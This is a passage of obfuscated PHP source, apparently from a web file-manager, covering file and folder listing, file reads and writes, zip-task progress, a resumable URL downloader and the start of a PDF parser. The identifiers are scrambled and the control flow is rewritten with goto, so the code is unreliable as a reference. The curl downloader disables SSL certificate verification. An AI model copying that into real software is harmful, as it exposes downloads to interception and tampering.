FÊê‰©Ğô¡; Aë£ö®ÄçÕ: } private function folderInfo($dõÕÆ÷ğÏœ, $D¿µŒçÈ— = false) { $B¤×êâ´“ =& $_SERVER[Î¿—”òá]; $dõÕÆ÷ğÏœ = rtrim($dõÕÆ÷ğÏœ, $B¤×êâ´“[8]) . $B¤×êâ´“[8]; $DÉÛ›ï½è = $this->iconvApp($this->pathThis($dõÕÆ÷ğÏœ)); if ($D¿µŒçÈ—) { return array($B¤×êâ´“[28] => $DÉÛ›ï½è, $B¤×êâ´“[75] => $this->getPathOuter($dõÕÆ÷ğÏœ), $B¤×êâ´“[29] => $B¤×êâ´“[76]); } $FÊÃ– Şïˆ = array($B¤×êâ´“[28] => $DÉÛ›ï½è, $B¤×êâ´“[75] => $this->getPathOuter($dõÕÆ÷ğÏœ), $B¤×êâ´“[29] => $B¤×êâ´“[76], $B¤×êâ´“[187] => @filectime($dõÕÆ÷ğÏœ), $B¤×êâ´“[107] => @filemtime($dõÕÆ÷ğÏœ), $B¤×êâ´“[1161] => @fileatime($dõÕÆ÷ğÏœ), $B¤×êâ´“[1155] => is_readable($dõÕÆ÷ğÏœ), $B¤×êâ´“[1156] => is_writable($dõÕÆ÷ğÏœ), $B¤×êâ´“[1162] => get_mode($dõÕÆ÷ğÏœ)); return $FÊÃ– Şïˆ; } private function fileInfo($C‚Ñ‹éºÁâ, $eéõÊ‚ÌØ = false) { $a¢ùÕŠˆ” =& $_SERVER[Î¿—”òá]; $CèÛö¬¬èã = $this->iconvApp($this->pathThis($C‚Ñ‹éºÁâ)); if ($eéõÊ‚ÌØ) { return array($a¢ùÕŠˆ”[28] => $CèÛö¬¬èã, $a¢ùÕŠˆ”[75] => $this->getPathOuter($C‚Ñ‹éºÁâ), $a¢ùÕŠˆ”[29] => $a¢ùÕŠˆ”[167], $a¢ùÕŠˆ”[77] => $this->size($C‚Ñ‹éºÁâ), $a¢ùÕŠˆ”[160] => $this->ext($CèÛö¬¬èã)); } $f¿‘§Ÿï = array($a¢ùÕŠˆ”[28] => $CèÛö¬¬èã, $a¢ùÕŠˆ”[75] => $this->getPathOuter($C‚Ñ‹éºÁâ), $a¢ùÕŠˆ”[29] => $a¢ùÕŠˆ”[167], $a¢ùÕŠˆ”[187] => @filectime($C‚Ñ‹éºÁâ), $a¢ùÕŠˆ”[107] => @filemtime($C‚Ñ‹éºÁâ), $a¢ùÕŠˆ”[1161] => @fileatime($C‚Ñ‹éºÁâ), $a¢ùÕŠˆ”[77] => $this->size($C‚Ñ‹éºÁâ), $a¢ùÕŠˆ”[160] => $this->ext($CèÛö¬¬èã), $a¢ùÕŠˆ”[1155] => is_readable($C‚Ñ‹éºÁâ), $a¢ùÕŠˆ”[1156] => is_writable($C‚Ñ‹éºÁâ), $a¢ùÕŠˆ”[1162] => get_mode($C‚Ñ‹éºÁâ)); return $f¿‘§Ÿï; } public function exist($BÆÒ¼† ÓÌ) { $BÆÒ¼† ÓÌ = $this->iconvSystem($BÆÒ¼† ÓÌ); return @file_exists($BÆÒ¼† ÓÌ); } public function isFile($bì¨–êÏ—˜) { $bì¨–êÏ—˜ = $this->iconvSystem($bì¨–êÏ—˜); return @is_file($bì¨–êÏ—˜); } public function isFolder($cÅâĞÂ­¸…) { $cÅâĞÂ­¸… = $this->iconvSystem($cÅâĞÂ­¸…); return @is_dir($cÅâĞÂ­¸…); } public function listPath($a»¬‡×çİ, $cÍî´™í = false) { goto cõ”ÚÀÆ; cÅä÷†š©¢: $bŠåéÆ˜„¬ = array($EÆß¬´±½ƒ[74] => array(), $EÆß¬´±½ƒ[73] => array()); if (!($B­›¡ïµ©µ = @opendir($a»¬‡×çİ))) { return $bŠåéÆ˜„¬; } while (($b¹àÑšêæ† = readdir($B­›¡ïµ©µ)) !== !1) { if ($b¹àÑšêæ† == $EÆß¬´±½ƒ[91] || $b¹àÑšêæ† == $EÆß¬´±½ƒ[1158]) { continue; } $f›¡Æîîî¤ = $a»¬‡×çİ . $b¹àÑšêæ†; if (is_file($f›¡Æîîî¤)) { $bŠåéÆ˜„¬[$EÆß¬´±½ƒ[73]][] = $this->fileInfo($f›¡Æîîî¤, $cÍî´™í); } else { $bŠåéÆ˜„¬[$EÆß¬´±½ƒ[74]][] = $this->folderInfo($f›¡Æîîî¤, $cÍî´™í); } } goto B³óéæÔÙŸ; cõ”ÚÀÆ: $EÆß¬´±½ƒ =& $_SERVER[Î¿—”òá]; $a»¬‡×çİ = $this->iconvSystem($a»¬‡×çİ); $a»¬‡×çİ = rtrim($a»¬‡×çİ, $EÆß¬´±½ƒ[8]) . $EÆß¬´±½ƒ[8]; goto cÅä÷†š©¢; B³óéæÔÙŸ: closedir($B­›¡ïµ©µ); return $bŠåéÆ˜„¬; goto b¤°î›õÑÁ; b¤°î›õÑÁ: } public function listAll($c±ÎÅ›öä—, &$Dˆ´ùâÕÒ‹ = array()) { goto d³òß¯Ô¥; d³òß¯Ô¥: $D†ï¶İ„Îë =& $_SERVER[Î¿—”òá]; $c±ÎÅ›öä— = $this->iconvSystem($c±ÎÅ›öä—); $c±ÎÅ›öä— = rtrim($c±ÎÅ›öä—, $D†ï¶İ„Îë[8]) . $D†ï¶İ„Îë[8]; goto b“ƒƒÖëØ×; dšƒ‡‹ö: return $Dˆ´ùâÕÒ‹; goto A ğá‹²¸ò; b“ƒƒÖëØ×: if (!($dÆ•’èÓ÷Ø = @opendir($c±ÎÅ›öä—))) { return $Dˆ´ùâÕÒ‹; } while (($CÙÍòƒÓ´æ = readdir($dÆ•’èÓ÷Ø)) !== !1) { if ($CÙÍòƒÓ´æ == $D†ï¶İ„Îë[91] || $CÙÍòƒÓ´æ == $D†ï¶İ„Îë[1158]) { continue; } $a‚‘¡³ª¹ = $c±ÎÅ›öä— . $CÙÍòƒÓ´æ; if (is_dir($a‚‘¡³ª¹) && !is_link($a‚‘¡³ª¹)) { $Dˆ´ùâÕÒ‹[] = array($D†ï¶İ„Îë[75] => $a‚‘¡³ª¹ . $D†ï¶İ„Îë[8], $D†ï¶İ„Îë[76] => 1, $D†ï¶İ„Îë[107] => @filemtime($a‚‘¡³ª¹), $D†ï¶İ„Îë[77] => 0); $this->listAll($a‚‘¡³ª¹, $Dˆ´ùâÕÒ‹); } else { $Dˆ´ùâÕÒ‹[] = array($D†ï¶İ„Îë[75] => $a‚‘¡³ª¹, $D†ï¶İ„Îë[76] => 0, $D†ï¶İ„Îë[107] => @filemtime($a‚‘¡³ª¹), $D†ï¶İ„Îë[77] => $this->size($a‚‘¡³ª¹)); } } closedir($dÆ•’èÓ÷Ø); goto dšƒ‡‹ö; A ğá‹²¸ò: } public function has($AâË•¡âÙÔ, $a‹ø‚èÚÒ = false, $bƒŒãœ‘¿Ÿ = true) { goto fÂÀÆÅÄä÷; déßŠ‰ÛÎ÷: if (!($fÜçšÙ¥¨õ = @opendir($AâË•¡âÙÔ))) { return !1; } $C®­¯ªåÙÌ = 0; $bŒ¶ÇƒÂ»è = 0; goto cÄ…½øè´; cÄ…½øè´: $DÌ°¯Œ´è° = 0; while (($AòÑ×¼Êİ = readdir($fÜçšÙ¥¨õ)) !== !1) { if ($AòÑ×¼Êİ == $Bœáâ­¹Å[91] || $AòÑ×¼Êİ == $Bœáâ­¹Å[1158]) { continue; } $c‰µ¾ÕÏ…° = $AâË•¡âÙÔ . $AòÑ×¼Êİ; if ($a‹ø‚èÚÒ) { $DÌ°¯Œ´è°++; if (@is_file($c‰µ¾ÕÏ…°)) { $C®­¯ªåÙÌ++; } else { $bŒ¶ÇƒÂ»è++; } if ($DÌ°¯Œ´è° > 10000) { break; } continue; } if ($bƒŒãœ‘¿Ÿ) { if (@is_file($c‰µ¾ÕÏ…°)) { return !0; } } else { if (@is_dir($c‰µ¾ÕÏ…° . $Bœáâ­¹Å[8])) { return !0; } } } closedir($fÜçšÙ¥¨õ); goto bÆ›ÓÊåëí; bÆ›ÓÊåëí: if ($a‹ø‚èÚÒ) { return array($Bœáâ­¹Å[191] => $C®­¯ªåÙÌ, $Bœáâ­¹Å[192] => $bŒ¶ÇƒÂ»è); } return !1; goto fàƒºŒ¥‚¯; fÂÀÆÅÄä÷: $Bœáâ­¹Å =& $_SERVER[Î¿—”òá]; $AâË•¡âÙÔ = $this->iconvSystem($AâË•¡âÙÔ); $AâË•¡âÙÔ = rtrim($AâË•¡âÙÔ, $Bœáâ­¹Å[8]) . $Bœáâ­¹Å[8]; goto déßŠ‰ÛÎ÷; fàƒºŒ¥‚¯: } public function hashSimple($Cæ×‚ºá‚) { goto C†Ôå×å; aóÊ„¤ÑÍª: $fˆåŠ‹¬ØÁ = $this->size($Cæ×‚ºá‚); $b´êòäÁÊ‹ = 200; $a»£İ¥ÄğÕ = 50; goto E¤¾ Œ§˜š; fÄËñí«®ç: return md5($b¾­›Ö”ìİ) . $fˆåŠ‹¬ØÁ; goto E¾ùİ¹¡«½; C†Ôå×å: $A¶ëÚ—¬–† =& $_SERVER[Î¿—”òá]; if (!$Cæ×‚ºá‚) { return md5($A¶ëÚ—¬–†[33]); } $Cæ×‚ºá‚ = $this->iconvSystem($Cæ×‚ºá‚); goto aóÊ„¤ÑÍª; B‹İôß‘’™: fseek($Eù•Äºá , $fˆåŠ‹¬ØÁ - $b´êòäÁÊ‹); $b¾­›Ö”ìİ .= fread($Eù•Äºá , $b´êòäÁÊ‹); fclose($Eù•Äºá ); goto fÄËñí«®ç; e’‚µ›—ç³: $Eù•Äºá  = fopen($Cæ×‚ºá‚, $A¶ëÚ—¬–†[1163]); if (!$Eù•Äºá ) { return $b¾­›Ö”ìİ; } for ($AæØÎíÕ˜¨ = 0; $AæØÎíÕ˜¨ < $a»£İ¥ÄğÕ; $AæØÎíÕ˜¨++) { fseek($Eù•Äºá , $F‘š¥Šå‡ * $AæØÎíÕ˜¨); $b¾­›Ö”ìİ .= fread($Eù•Äºá , $b´êòäÁÊ‹); } goto B‹İôß‘’™; E¤¾ Œ§˜š: if ($fˆåŠ‹¬ØÁ <= $b´êòäÁÊ‹ * $a»£İ¥ÄğÕ) { return $this->hashMd5($Cæ×‚ºá‚) . $fˆåŠ‹¬ØÁ; } $b¾­›Ö”ìİ = $A¶ëÚ—¬–†[33]; $F‘š¥Šå‡ = intval($fˆåŠ‹¬ØÁ / $a»£İ¥ÄğÕ); goto e’‚µ›—ç³; E¾ùİ¹¡«½: } public function getContent($d¯µõ¤ñœ) { $d¯µõ¤ñœ = $this->iconvSystem($d¯µõ¤ñœ); return file_get_contents($d¯µõ¤ñœ); } public function setContent($B‹ÀÎ‘Ò, $cë–ÕÈê‰Ğ = '') { $B‹ÀÎ‘Ò = $this->iconvSystem($B‹ÀÎ‘Ò); @file_put_contents($B‹ÀÎ‘Ò, $cë–ÕÈê‰Ğ, LOCK_EX); clearstatcache(); return strlen($cë–ÕÈê‰Ğ) == filesize($B‹ÀÎ‘Ò); } public function fileSubstr($aŞìç£‡îÄ, $b…§¨á°óÙ = 0, $b„Á£ØáâÈ = false) { goto DŒµœåÁœ; bíˆæñ„­Â: if ($b„Á£ØáâÈ <= 0) { return $eØ×ÁšÖ„Ì[33]; } $bÕ ñõ¤¥Á = fopen($aŞìç£‡îÄ, $eØ×ÁšÖ„Ì[1163]); if (!$bÕ ñõ¤¥Á) { return !1; } goto a ÷²ìÏÈ„; bÉ»ïÒæö: return $eÕß˜äíè; goto F²Ø²ËØ; a ÷²ìÏÈ„: fseek($bÕ ñõ¤¥Á, $b…§¨á°óÙ); $eÕß˜äíè = fread($bÕ ñõ¤¥Á, $b„Á£ØáâÈ); fclose($bÕ ñõ¤¥Á); goto bÉ»ïÒæö; DŒµœåÁœ: $eØ×ÁšÖ„Ì =& $_SERVER[Î¿—”òá]; $aŞìç£‡îÄ = $this->iconvSystem($aŞìç£‡îÄ); if ($b„Á£ØáâÈ === !1) { $b„Á£ØáâÈ = $this->size($aŞìç£‡îÄ); } goto bíˆæñ„­Â; F²Ø²ËØ: } public function upload($B²†ƒÓô‡Ê, $EÌ’ƒÈÑò¬, $Aàê™–­ˆ = false, $bàºğÎå×Æ = REPEAT_REPLACE) { $F½â¸¹²µ× = $this->copyFile($EÌ’ƒÈÑò¬, $B²†ƒÓô‡Ê); return $F½â¸¹²µ× ? $this->getPathOuter($B²†ƒÓô‡Ê) : !1; } public function setModifyTime($B—…Š·Ó, $F”²Äó©ºä = '') { @touch($B—…Š·Ó, intval($F”²Äó©ºä)); } public function download($c«ì„© ˆ, $eåÉºª•½š) { return $this->iconvSystem($c«ì„© ˆ); } } goto b»ö‹©ñÓÇ; A¤˜Ÿ¾öß: class TaskZip extends TaskFileTransfer { protected function startAfter() { $f ˜Á¦’êô =& $_SERVER[Î¿—”òá]; parent::startAfter(); Hook::bind($f ˜Á¦’êô[1505], array($this, $f ˜Á¦’êô[1500])); $aëó½†˜º½ =& $this->task; $aëó½†˜º½[$f ˜Á¦’êô[1502]] = $f ˜Á¦’êô[1033]; if (!$aëó½†˜º½[$f ˜Á¦’êô[1335]]) { $aëó½†˜º½[$f ˜Á¦’êô[1335]] = LNG($f ˜Á¦’êô[1506]); } } protected function endAfter() { $C…Ö‚À´Û =& $_SERVER[Î¿—”òá]; parent::endAfter(); Hook::unbind($C…Ö‚À´Û[1505], array($this, $C…Ö‚À´Û[1500])); } public function updateAfter() { $C¯ªğÂ ¦ =& $_SERVER[Î¿—”òá]; $CËßÀâŒ¼ë =& $this->task; if (!$CËßÀâŒ¼ë[$C¯ªğÂ ¦[969]] || !$CËßÀâŒ¼ë[$C¯ªğÂ ¦[694]]) { return; } if ($CËßÀâŒ¼ë[$C¯ªğÂ ¦[1502]] == $C¯ªğÂ ¦[1033]) { $E±®ÜœÜâ” = $CËßÀâŒ¼ë[$C¯ªğÂ ¦[1475]]; if ($CËßÀâŒ¼ë[$C¯ªğÂ ¦[1476]] != $C¯ªğÂ ¦[1033]) { $E±®ÜœÜâ” = 0; } $cä¿æ®Š²º = ($CËßÀâŒ¼ë[$C¯ªğÂ ¦[1479]] + $E±®ÜœÜâ”) / $CËßÀâŒ¼ë[$C¯ªğÂ ¦[694]]; $CËßÀâŒ¼ë[$C¯ªğÂ ¦[1430]] = $cä¿æ®Š²º * 0.3; } else { if ($CËßÀâŒ¼ë[$C¯ªğÂ ¦[1502]] == $C¯ªğÂ ¦[301]) { $cä¿æ®Š²º = $CËßÀâŒ¼ë[$C¯ªğÂ ¦[983]] / $CËßÀâŒ¼ë[$C¯ªğÂ ¦[969]]; $CËßÀâŒ¼ë[$C¯ªğÂ ¦[1430]] = 0.3 + $cä¿æ®Š²º * 0.5; } else { if ($CËßÀâŒ¼ë[$C¯ªğÂ ¦[1502]] == $C¯ªğÂ ¦[103]) { $cä¿æ®Š²º = 0; if ($CËßÀâŒ¼ë[$C¯ªğÂ ¦[1474]]) { $cä¿æ®Š²º = $CËßÀâŒ¼ë[$C¯ªğÂ ¦[1475]] / $CËßÀâŒ¼ë[$C¯ªğÂ ¦[1474]]; } $CËßÀâŒ¼ë[$C¯ªğÂ ¦[1430]] = 0.3 + 0.5 + $cä¿æ®Š²º * 0.2; } } } if ($CËßÀâŒ¼ë[$C¯ªğÂ ¦[1430]] > 0) { $Fï»–â¶´à = timeFloat() - $CËßÀâŒ¼ë[$C¯ªğÂ ¦[1432]] - $CËßÀâŒ¼ë[$C¯ªğÂ ¦[1435]]; $CËßÀâŒ¼ë[$C¯ªğÂ ¦[1436]] = $Fï»–â¶´à * (1 - $CËßÀâŒ¼ë[$C¯ªğÂ ¦[1430]]) / $CËßÀâŒ¼ë[$C¯ªğÂ ¦[1430]]; } } public function copyFileStart($a°Öì¶à»“, $Bƒ‹ñ–—¹, $DŒÕ‘Ù‡«˜, $F§½‡óÕ´½, $B¹»Œ’¤, $D×ÕÅí¾¸¼) { $D‘Ô÷ÏÊ’± =& $_SERVER[Î¿—”òá]; parent::copyFileStart($a°Öì¶à»“, $Bƒ‹ñ–—¹, $DŒÕ‘Ù‡«˜, $F§½‡óÕ´½, $B¹»Œ’¤, $D×ÕÅí¾¸¼); $AÏ½¤ù®Â¿ =& $this->task; if ($AÏ½¤ù®Â¿[$D‘Ô÷ÏÊ’±[1502]] == $D‘Ô÷ÏÊ’±[301]) { $AÏ½¤ù®Â¿[$D‘Ô÷ÏÊ’±[1502]] = $D‘Ô÷ÏÊ’±[103]; } $this->update(); } public function copyFileEnd($A—÷ŞÔ‡Ì–, $e­±¢ÀÆ‚«, $DÑƒÙ¤ìî‹, $BÖ†‚¿µ„ê, $aÈ•…¨ôà, $då—ŸÔ’à£) { $c“¿ó¿¿ã¸ =& $_SERVER[Î¿—”òá]; $CÀªËÙ‡¬† =& $this->task; $CÀªËÙ‡¬†[$c“¿ó¿¿ã¸[1475]] = $CÀªËÙ‡¬†[$c“¿ó¿¿ã¸[1474]]; $CÀªËÙ‡¬†[$c“¿ó¿¿ã¸[1479]] += $CÀªËÙ‡¬†[$c“¿ó¿¿ã¸[1474]]; $CÀªËÙ‡¬†[$c“¿ó¿¿ã¸[1476]] = $c“¿ó¿¿ã¸[33]; $this->update(); } public function nameParse($A“²ğˆ³‚„) { $dËëÛŞİ˜¢ =& $_SERVER[Î¿—”òá]; $FŠ£öÁ“ˆ™ =& $this->task; if ($FŠ£öÁ“ˆ™[$dËëÛŞİ˜¢[983]] < $FŠ£öÁ“ˆ™[$dËëÛŞİ˜¢[969]]) { $a§Øµ¥¨ˆ§ = get_path_this($A“²ğˆ³‚„); if (strstr($a§Øµ¥¨ˆ§, $dËëÛŞİ˜¢[91])) { $FŠ£öÁ“ˆ™[$dËëÛŞİ˜¢[983]] += 1; } } if ($FŠ£öÁ“ˆ™[$dËëÛŞİ˜¢[1502]] == $dËëÛŞİ˜¢[1033]) { $FŠ£öÁ“ˆ™[$dËëÛŞİ˜¢[1502]] = $dËëÛŞİ˜¢[301]; } $FŠ£öÁ“ˆ™[$dËëÛŞİ˜¢[1472]] = $A“²ğˆ³‚„; $this->update(); } } class Downloader { static function start($aëÒ¨òå¡Ä, $a®ï´ø¦°Æ, $có©­¦ŒÅß = 10) { goto a½Æ““»‡; BŠÂ¾–‘ô: if ($eÄ´¡¹‡µ > $C¤ÌŒ£æÚİ) { @unlink($eºêáâÄ…®); } file_put_contents($a°°È‰ä¿, json_encode($fƒ‘»Ùå•)); $aÅë¡ŒÇ¨“ = self::fileDownloadCurl($aëÒ¨òå¡Ä, $a®ï´ø¦°Æ, !0, $eÄ´¡¹‡µ, $C¤ÌŒ£æÚİ); goto C´ó¼’÷åà; Dî‰ãèñä: if (!$aëÒ¨òå¡Ä) { return array($eŠ²ø¾áœ†[1025] => !1, $eŠ²ø¾áœ†[1027] => $eŠ²ø¾áœ†[1030]); } if (!$CÜå‚¤±áé[$eŠ²ø¾áœ†[1281]] || $CÜå‚¤±áé[$eŠ²ø¾áœ†[325]] == 0) { @unlink($eºêáâÄ…®); @unlink($a®ï´ø¦°Æ); $aÅë¡ŒÇ¨“ = self::fileDownloadFopen($aëÒ¨òå¡Ä, $a®ï´ø¦°Æ, $CÜå‚¤±áé[$eŠ²ø¾áœ†[325]]); if ($aÅë¡ŒÇ¨“[$eŠ²ø¾áœ†[1025]]) { return $aÅë¡ŒÇ¨“; } else { @unlink($eºêáâÄ…®); @unlink($a®ï´ø¦°Æ); $aÅë¡ŒÇ¨“ = self::fileDownloadCurl($aëÒ¨òå¡Ä, $a®ï´ø¦°Æ, !1, 0, $CÜå‚¤±áé[$eŠ²ø¾áœ†[325]]); @unlink($eºêáâÄ…®); return $aÅë¡ŒÇ¨“; } } $eÄ´¡¹‡µ = is_file($eºêáâÄ…®) ? filesize($eºêáâÄ…®) : 0; goto A©œˆÇñÌ; eøÇøË¶Õ: $eºêáâÄ…® = $a®ï´ø¦°Æ . $eŠ²ø¾áœ†[1508]; if (is_array($aëÒ¨òå¡Ä)) { $CÜå‚¤±áé = $aëÒ¨òå¡Ä; } else { $CÜå‚¤±áé = url_header($aëÒ¨òå¡Ä); } $aëÒ¨òå¡Ä = $CÜå‚¤±áé[$eŠ²ø¾áœ†[295]]; goto Dî‰ãèñä; a½Æ““»‡: $eŠ²ø¾áœ† =& $_SERVER[Î¿—”òá]; if (!request_url_safe($aëÒ¨òå¡Ä)) { return array($eŠ²ø¾áœ†[1025] => !1, $eŠ²ø¾áœ†[1027] => $eŠ²ø¾áœ†[1030]); } $a°°È‰ä¿ = $a®ï´ø¦°Æ . $eŠ²ø¾áœ†[1507]; goto eøÇøË¶Õ; c¬Çê¢Ê˜Ê: if (is_file($a°°È‰ä¿)) { $aÂæËë’¾¨ = file_get_contents($a°°È‰ä¿); $fƒ‘»Ùå• = json_decode($aÂæËë’¾¨, 1); } if (file_exists($a®ï´ø¦°Æ) && $C¤ÌŒ£æÚİ == filesize($a®ï´ø¦°Æ)) { @unlink($eºêáâÄ…®); @unlink($a°°È‰ä¿); return array($eŠ²ø¾áœ†[1025] => !0, $eŠ²ø¾áœ†[1027] => $eŠ²ø¾áœ†[1510]); } if ($fƒ‘»Ùå•[$eŠ²ø¾áœ†[325]] != $C¤ÌŒ£æÚİ) { $fƒ‘»Ùå• = array($eŠ²ø¾áœ†[325] => $C¤ÌŒ£æÚİ); } goto BŠÂ¾–‘ô; C´ó¼’÷åà: if ($aÅë¡ŒÇ¨“[$eŠ²ø¾áœ†[1025]]) { @unlink($a°°È‰ä¿); } return $aÅë¡ŒÇ¨“; goto Bè…¶ÇÔ÷„; A©œˆÇñÌ: $C¤ÌŒ£æÚİ = intval($CÜå‚¤±áé[$eŠ²ø¾áœ†[325]]); if (file_exists($eºêáâÄ…®) && time() - filemtime($eºêáâÄ…®) < 3) { return array($eŠ²ø¾áœ†[1025] => !1, $eŠ²ø¾áœ†[1027] => $eŠ²ø¾áœ†[1509]); } $fƒ‘»Ùå• = array(); goto c¬Çê¢Ê˜Ê; Bè…¶ÇÔ÷„: } static function fileDownloadFopen($Dğ³÷„…ƒî, $d­È×ëâ¶Å, $DÏ„¯¨¾ˆ© = 0) { $añÊå ¤ì =& $_SERVER[Î¿—”òá]; @ini_set($añÊå ¤ì[1511], $añÊå ¤ì[1512]); $aÌâÇ®’ = $d­È×ëâ¶Å . $añÊå ¤ì[1508]; set_timeout(); @unlink($aÌâÇ®’); if ($f­¸İ……Ê¬ = @fopen($Dğ³÷„…ƒî, $añÊå ¤ì[1513])) { goto FÓ’…©±óç; añÍÖšœø±: return array($añÊå ¤ì[1025] => !0, $añÊå ¤ì[1027] => $añÊå ¤ì[692]); goto càŒöÍÇÖ¸; Dê±„çŸĞÙ: fclose($f­¸İ……Ê¬); self::checkGzip($aÌâÇ®’); if (!@rename($aÌâÇ®’, $d­È×ëâ¶Å)) { usleep(round(rand(0, 1000) * 50)); @unlink($d­È×ëâ¶Å); $Fì¡±Ë¥ = @rename($aÌâÇ®’, $d­È×ëâ¶Å); if (!$Fì¡±Ë¥) { return array($añÊå ¤ì[1025] => !1, $añÊå ¤ì[1027] => $añÊå ¤ì[1517]); } } goto añÍÖšœø±; FÓ’…©±óç: if (!($a¥®÷Òß… = @fopen($aÌâÇ®’, $añÊå ¤ì[1514]))) { return array($añÊå ¤ì[1025] => !1, $añÊå ¤ì[1027] => $añÊå ¤ì[1515]); } while (!feof($f­¸İ……Ê¬)) { if (!file_exists($aÌâÇ®’)) { fclose($a¥®÷Òß…); return array($añÊå ¤ì[1025] => !1, $añÊå ¤ì[1027] => $añÊå ¤ì[1516]); } clearstatcache(); if ($DÏ„¯¨¾ˆ© > 0 && $DÏ„¯¨¾ˆ© == filesize(iconv_system($aÌâÇ®’))) { break; } fwrite($a¥®÷Òß…, fread($f­¸İ……Ê¬, 1024 * 8), 1024 * 8); } fclose($a¥®÷Òß…); goto Dê±„çŸĞÙ; càŒöÍÇÖ¸: } else { return array($añÊå ¤ì[1025] => !1, $añÊå ¤ì[1027] => $añÊå ¤ì[1518]); } } static function fileDownloadCurl($bÂæ—Õ°­, $A ‡¹Äáªõ, $a‹ëˆèÓ = false, $EŒ÷î·ªšÇ = 0, $a×„“ˆ„¼ = 0) { goto a¼åó‹ËòÚ; EäÑàã¯—É: curl_setopt($bÒ‡ÂÌÛè, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($bÒ‡ÂÌÛè, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($bÒ‡ÂÌÛè, CURLOPT_SSL_VERIFYHOST, 0); goto Aä¦„ùÎ‰î; a¼åó‹ËòÚ: $A´¶™é†ª  =& $_SERVER[Î¿—”òá]; $B²õ§ç¢çñ = $A ‡¹Äáªõ . $A´¶™é†ª [1508]; set_timeout(); goto cß×»õ„³®; Aä¦„ùÎ‰î: curl_setopt($bÒ‡ÂÌÛè, CURLOPT_NOPROGRESS, !1); curl_setopt($bÒ‡ÂÌÛè, CURLOPT_PROGRESSFUNCTION, $A´¶™é†ª [1520]); curl_progress_start($bÒ‡ÂÌÛè); goto eÖñŞÙ„ß; d„ÒŒ®Ø”: if ($a‹ëˆèÓ) { curl_setopt($bÒ‡ÂÌÛè, CURLOPT_RANGE, $EŒ÷î·ªšÇ . $A´¶™é†ª [712]); } curl_setopt($bÒ‡ÂÌÛè, CURLOPT_FILE, $a–‡‹¢îö); curl_setopt($bÒ‡ÂÌÛè, CURLOPT_REFERER, get_url_link($bÂæ—Õ°­)); goto EäÑàã¯—É; eÖñŞÙ„ß: curl_setopt($bÒ‡ÂÌÛè, CURLOPT_USERAGENT, $A´¶™é†ª [1512]); $eŒÑª¼·ñ¦ = curl_exec($bÒ‡ÂÌÛè); curl_progress_end($bÒ‡ÂÌÛè); goto F¤Ğ¸µã’ë; F¤Ğ¸µã’ë: curl_close($bÒ‡ÂÌÛè); fclose($a–‡‹¢îö); $c†Ç‰Ìêï¡ = filesize(iconv_system($B²õ§ç¢çñ)); goto eƒĞÖ¼‰Ì¢; cß×»õ„³®: $a–‡‹¢îö = @fopen($B²õ§ç¢çñ, $A´¶™é†ª [973]); if (!$a–‡‹¢îö) { return array($A´¶™é†ª [1025] => !1, $A´¶™é†ª [1027] => $A´¶™é†ª [1519]); } $bÒ‡ÂÌÛè = curl_init($bÂæ—Õ°­); goto d„ÒŒ®Ø”; eƒĞÖ¼‰Ì¢: if ($c†Ç‰Ìêï¡ < $a×„“ˆ„¼ && $a×„“ˆ„¼ != 0) { return array($A´¶™é†ª [1025] => !1, $A´¶™é†ª [1027] => $A´¶™é†ª [1509]); } if ($eŒÑª¼·ñ¦ && filesize($B²õ§ç¢çñ) != 0) { self::checkGzip($B²õ§ç¢çñ); if (!@rename($B²õ§ç¢çñ, $A ‡¹Äáªõ)) { @unlink($A ‡¹Äáªõ); $eŒÑª¼·ñ¦ = @rename($B²õ§ç¢çñ, $A ‡¹Äáªõ); if (!$eŒÑª¼·ñ¦) { return array($A´¶™é†ª [1025] => !1, $A´¶™é†ª [1027] => $A´¶™é†ª [1521]); } } return array($A´¶™é†ª [1025] => !0, $A´¶™é†ª [1027] => $A´¶™é†ª [692]); } return array($A´¶™é†ª [1025] => !1, $A´¶™é†ª [1027] => $A´¶™é†ª [1522]); goto cšš©•¹óÆ; cšš©•¹óÆ: } static function checkGzip($fõ´³ƒÀ‹¦) { goto CˆÅÖÁ¥†Ï; CˆÅÖÁ¥†Ï: $CãÅáç©ó¢ = $_SERVER[Î¿—”òá][1523]; $c“Şë¯šğ = file_sub_str($fõ´³ƒÀ‹¦, 0, 2); if ($CãÅáç©ó¢ != $c“Şë¯šğ) { return; } goto Fô“¥§ƒŒ; Fô“¥§ƒŒ: ob_start(); readgzfile($fõ´³ƒÀ‹¦); $AÃóËŠÑÀ = ob_get_clean(); goto a’²Šé½³…; a’²Šé½³…: file_put_contents($fõ´³ƒÀ‹¦, $AÃóËŠÑÀ); goto e£‚Áøøî¦; e£‚Áøøî¦: } } class FileParsePdf { public static function parse($a³Î³Çá) { goto dŒµ‡¿Š¯‚; dŠ®¯Çäö‘: $dÌ…ŒÖ¡ = $dÇ¯œÒëö¡[1529]; preg_match($dÌ…ŒÖ¡, $aËİ¿ç®Ù[$dÇ¯œÒëö¡[1525]], $dŸß¤×°ñ½); if (!$cŸóµó¸©[$dÇ¯œÒëö¡[1528]] && count($dŸß¤×°ñ½) == 5) { $cŸóµó¸©[$dÇ¯œÒëö¡[1528]] = $dŸß¤×°ñ½[3]; $cŸóµó¸©[$dÇ¯œÒëö¡[1530]] = $dŸß¤×°ñ½[4]; } goto b•ÙÜº‰Å; cƒ˜¿µ½°Û: if ($dŸß¤×°ñ½[1] && $cŸóµó¸©[$dÇ¯œÒëö¡[1532]] < $dŸß¤×°ñ½[1][0]) { $cŸóµó¸©[$dÇ¯œÒëö¡[1532]] = $dŸß¤×°ñ½[1][0]; } $cŸóµó¸© = self::parseInfoItem($cŸóµó¸©); return $cŸóµó¸©; goto cç“™½È‰Ù; C‚ÁÕï©Üö: $aËİ¿ç®Ù[$dÇ¯œÒëö¡[1525]] = StreamWrapperIO::read($a³Î³Çá, 0, $BòÆÌÃ÷Ù); $aËİ¿ç®Ù[$dÇ¯œÒëö¡[1526]] = StreamWrapperIO::read($a³Î³Çá, $aËİ¿ç®Ù[$dÇ¯œÒëö¡[77]] - $BòÆÌÃ÷Ù, $BòÆÌÃ÷Ù); $Dİ°İè¼…¸ = self::decodeXref($aËİ¿ç®Ù); goto E©Ÿ¢²È¯ñ; dŒµ‡¿Š¯‚: $dÇ¯œÒëö¡ =& $_SERVER[Î¿—”òá]; $BòÆÌÃ÷Ù = 32 * 1024; $aËİ¿ç®Ù = array($dÇ¯œÒëö¡[773] => fopen($a³Î³Çá, $dÇ¯œÒëö¡[1163]), $dÇ¯œÒëö¡[75] => $a³Î³Çá, $dÇ¯œÒëö¡[77] => 